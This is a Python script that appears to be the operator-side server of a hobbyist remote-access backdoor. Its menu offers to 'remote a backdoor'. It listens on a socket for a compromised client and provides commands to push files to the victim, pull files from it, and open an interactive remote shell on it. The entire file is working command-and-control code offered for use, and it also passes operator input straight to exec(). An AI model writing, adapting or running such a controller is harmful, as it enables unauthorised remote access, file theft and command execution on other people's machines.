#!/usr/bin/python

#import the required modules
import socket
import os
import struct



##############################################
#                                            #
#                   v1.0                     #
#           Coded by Blueman678              #
#   GitHub: https://github.com/Blueman678/   #
#                                            #
##############################################



class Server(): #class Server: define the client properties
    def __init__(self, client = None):
        self.client = client
        self.HOST = "127.0.0.1"
        self.PORT = 51025

    def send(self, data): #custom send function
        pkt = struct.pack('>I', len(data)) + data
        self.client.sendall(pkt)

    def recv(self): #custom recv function
        pktlen = self.recvall(4)
        if not pktlen: return ""
        pktlen = struct.unpack('>I', pktlen)[0]
        return self.recvall(pktlen)

    def recvall(self, n): #format the receipts packets
        packet = b''
        while len(packet) < n:
            frame = self.client.recv(n - len(packet))
            if not frame:
                return None
            packet += frame
        return packet



def main_menu(): #define the main menu
    os.system('cls')
    print("""
    1. Listen to a port and remote a backdoor
    2. Exit
    """)
    choice = input("\n Enter your choice: ")
    if int(choice) == 1:
        listener()
    elif int(choice) == 2:
        exit()


def listener(): #define the socket and listen for connections
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((Server().HOST, Server().PORT))
    sock.listen(1)
    print("\nServer is listening...")
    while True:
        client, address = sock.accept()
        global server
        server = Server(client)
        print(f"Client {address[0]} on port {address[1]} is connected!")
        os.system('pause')
        interpreter(sock, client)


def interpreter(sock, client): #wait for commands and interpret them
    print("Enter a command or 'help', for a list of the availables commands")
    os.system('cls')
    while True:
        command = input('>>> ')
        try:
            if command == 'exit':
                server.send('exit'.encode())
                client.close()
                sock.close()
                exit()
            else:
                exec(f"{command}()")
        except NameError:
            print("Command not found! Enter 'help' to see the availables commands.")



def help(): #help command: show the availables commands
    print(
    """
    Here are the differents availables commands:\n
    - upload: Upload a file to the client.
    - download: Download a file from the client.
    - cmd: Open a shell on the client machine.
    - exit: Exit and close the socket and client session.
    \n
    """)
    os.system('pause')


def upload(): #upload command: upload a file to the client
    server.send("upload".encode())
    local_path = input("Please enter the path of your local file: ")
    try:
        with open(local_path, 'rb') as file:
            while True:
                a = file.read(1024)
                if not a:
                    break
                server.send(a)
        server.send(local_path.split('/')[-1].encode())
        print('File sent succesful!')
    except FileNotFoundError:
        print("File not found!")
    os.system('pause')


def download(): #download command: download a file from the client
    server.send("download".encode())
    client_path = input("Please enter the path of the client file: ")
    server.send(client_path.encode())
    file_content = server.recv()
    file_name = server.recv()
    with open(file_name, 'wb') as file:
        file.write(file_content)
    print("File received succesful!")
    os.system('pause')


def cmd(): #cmd command: open a shell on the client machine
    os.system('cls')
    server.send('cmd'.encode())
    while True: 
        dir = server.recv().decode().strip()
        cmd = input(dir + ' ')
        if cmd != 'exit':
            server.send(cmd.encode())
            response = server.recv().decode('cp850').strip()
            print(response)
        else:
            server.send('exit'.encode())
            break


main_menu()
    
